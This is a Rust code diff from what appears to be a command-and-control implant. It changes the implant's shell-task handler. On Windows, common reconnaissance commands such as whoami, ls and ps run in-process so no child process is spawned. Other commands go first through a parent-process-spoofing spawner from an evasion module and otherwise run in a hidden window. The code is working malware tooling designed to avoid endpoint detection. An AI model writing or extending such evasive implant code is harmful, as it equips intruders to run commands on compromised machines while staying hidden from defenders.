@@ -28,27 +28,166 @@ pub fn run(task: &Task) -> TaskOutput {
 fn exec_shell(task: &Task) -> TaskOutput {
     let cmd = match args_as_str(task) {
         Some(c) => c,
-        None => return TaskOutput::failure("shell: no command"),
+        None    => return TaskOutput::failure("shell: no command"),
     };
-
+    // Intercept well-known recon commands in-process so no child process is spawned.
     #[cfg(target_os = "windows")]
-    let output = std::process::Command::new("cmd")
-        .args(["/C", &cmd])
-        .output();
+    if let Some(out) = dispatch_inproc(&cmd) {
+        return out;
+    }
+    spawn_shell(&cmd)
+}
 
-    #[cfg(not(target_os = "windows"))]
-    let output = std::process::Command::new("sh")
-        .args(["-c", &cmd])
-        .output();
-
-    match output {
-        Ok(o) => {
-            let mut data = o.stdout;
-            data.extend_from_slice(&o.stderr);
-            TaskOutput::success(data)
-        }
+// Windows path: try PPID-spoofed spawner first, fall back to cmd with CREATE_NO_WINDOW.
+#[cfg(target_os = "windows")]
+fn spawn_shell(cmd: &str) -> TaskOutput {
+    #[cfg(feature = "ppid-spoof")]
+    match crate::evasion::spawn_shell_spoofed(cmd) {
+        Ok(data) => return TaskOutput::success(data),
+        Err(_)   => {}
+    }
+    use std::os::windows::process::CommandExt;
+    const CREATE_NO_WINDOW: u32 = 0x0800_0000;
+    match std::process::Command::new("cmd")
+        .args(["/C", cmd])
+        .creation_flags(CREATE_NO_WINDOW)
+        .output()
+    {
+        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); TaskOutput::success(d) }
         Err(e) => TaskOutput::failure(&e.to_string()),
     }
+}
+
+#[cfg(not(target_os = "windows"))]
+fn spawn_shell(cmd: &str) -> TaskOutput {
+    match std::process::Command::new("sh").args(["-c", cmd]).output() {
+        Ok(o)  => { let mut d = o.stdout; d.extend_from_slice(&o.stderr); TaskOutput::success(d) }
+        Err(e) => TaskOutput::failure(&e.to_string()),
+    }
+}
+
+// Match the first token of the input against known in-process commands.
+// Returns None to fall through to spawn_shell for unrecognised or complex invocations.
+#[cfg(target_os = "windows")]
+fn dispatch_inproc(input: &str) -> Option<TaskOutput> {
+    let t = input.trim();
+    let (verb, rest) = t.find(|c: char| c.is_ascii_whitespace())
+        .map(|i| (&t[..i], t[i..].trim()))
+        .unwrap_or((t, ""));
+    match verb.to_ascii_lowercase().as_str() {
+        "whoami" if rest.is_empty() => Some(inproc_whoami()),
+        "hostname"                  => Some(inproc_hostname()),
+        "pwd"                       => Some(inproc_pwd()),
+        "cd" if rest.is_empty()     => Some(inproc_pwd()),
+        "cd"                        => Some(inproc_cd(rest)),
+        "ls" | "dir"                => Some(inproc_ls(rest)),
+        "ps" | "tasklist"           => Some(inproc_ps()),
+        "getpid" | "pid"            => Some(inproc_getpid()),
+        _                           => None,
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn inproc_whoami() -> TaskOutput {
+    let domain = std::env::var("USERDOMAIN").unwrap_or_default();
+    let user   = std::env::var("USERNAME").unwrap_or_default();
+    let out = if domain.is_empty() { user } else { format!("{domain}\\{user}") };
+    TaskOutput::success(out.into_bytes())
+}
+
+#[cfg(target_os = "windows")]
+fn inproc_hostname() -> TaskOutput {
+    TaskOutput::success(std::env::var("COMPUTERNAME").unwrap_or_default().into_bytes())
+}
+
+#[cfg(target_os = "windows")]
+fn inproc_pwd() -> TaskOutput {
+    match std::env::current_dir() {
+        Ok(p)  => TaskOutput::success(p.to_string_lossy().into_owned().into_bytes()),
+        Err(e) => TaskOutput::failure(&format!("pwd: {e}")),
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn inproc_cd(path: &str) -> TaskOutput {
+    match std::env::set_current_dir(path) {
+        Ok(())  => inproc_pwd(),
+        Err(_) => TaskOutput::failure(&format!("cd: cannot change to '{path}'")),
+    }
+}
+
+#[cfg(target_os = "windows")]
+fn inproc_ls(path: &str) -> TaskOutput {
+    use windows_sys::Win32::Storage::FileSystem::{
+        FindClose, FindFirstFileW, FindNextFileW, WIN32_FIND_DATAW,
+        FILE_ATTRIBUTE_DIRECTORY,
+    };
+    let search: Vec<u16> = if path.is_empty() {
+        "*\0".encode_utf16().collect()
+    } else if path.ends_with('\\') || path.ends_with('/') {
+        format!("{path}*\0").encode_utf16().collect()
+    } else {
+        format!("{path}\\*\0").encode_utf16().collect()
+    };
+    let mut fd: WIN32_FIND_DATAW = unsafe { core::mem::zeroed() };
+    let h = unsafe { FindFirstFileW(search.as_ptr(), &mut fd) };
+    if h == -1isize {
+        return TaskOutput::failure(&format!("ls: cannot access '{path}'"));
+    }
+    let mut out = String::new();
+    loop {
+        let nlen = fd.cFileName.iter().position(|&c| c == 0).unwrap_or(260);
+        let name = String::from_utf16_lossy(&fd.cFileName[..nlen]);
+        if name != "." && name != ".." {
+            if fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY != 0 {
+                out.push_str(&format!("{name:<40} <DIR>\n"));
+            } else {
+                let size = ((fd.nFileSizeHigh as u64) << 32) | fd.nFileSizeLow as u64;
+                out.push_str(&format!("{name:<40} {size}\n"));
+            }
+        }
+        fd = unsafe { core::mem::zeroed() };
+        if unsafe { FindNextFileW(h, &mut fd) } == 0 { break; }
+    }
+    unsafe { FindClose(h) };
+    TaskOutput::success(out.into_bytes())
+}
+
+#[cfg(target_os = "windows")]
+fn inproc_ps() -> TaskOutput {
+    use windows_sys::Win32::Foundation::{CloseHandle, INVALID_HANDLE_VALUE};
+    use windows_sys::Win32::System::Diagnostics::ToolHelp::{
+        CreateToolhelp32Snapshot, Process32FirstW, Process32NextW,
+        PROCESSENTRY32W, TH32CS_SNAPPROCESS,
+    };
+    let mut out = format!("{:<8} {:<8} {}\n{}\n", "PID", "PPID", "Name", "-".repeat(50));
+    unsafe {
+        let snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if snap == INVALID_HANDLE_VALUE {
+            return TaskOutput::failure("ps: CreateToolhelp32Snapshot failed");
+        }
+        let mut e: PROCESSENTRY32W = core::mem::zeroed();
+        e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
+        if Process32FirstW(snap, &mut e) != 0 {
+            loop {
+                let nlen = e.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
+                let name = String::from_utf16_lossy(&e.szExeFile[..nlen]);
+                out.push_str(&format!("{:<8} {:<8} {name}\n",
+                    e.th32ProcessID, e.th32ParentProcessID));
+                e = core::mem::zeroed();
+                e.dwSize = core::mem::size_of::<PROCESSENTRY32W>() as u32;
+                if Process32NextW(snap, &mut e) == 0 { break; }
+            }
+        }
+        CloseHandle(snap);
+    }
+    TaskOutput::success(out.into_bytes())
+}
+
+#[cfg(target_os = "windows")]
+fn inproc_getpid() -> TaskOutput {
+    use windows_sys::Win32::System::Threading::GetCurrentProcessId;
+    TaskOutput::success(unsafe { GetCurrentProcessId() }.to_string().into_bytes())
 }
 
 // ---------------------------------------------------------------------------
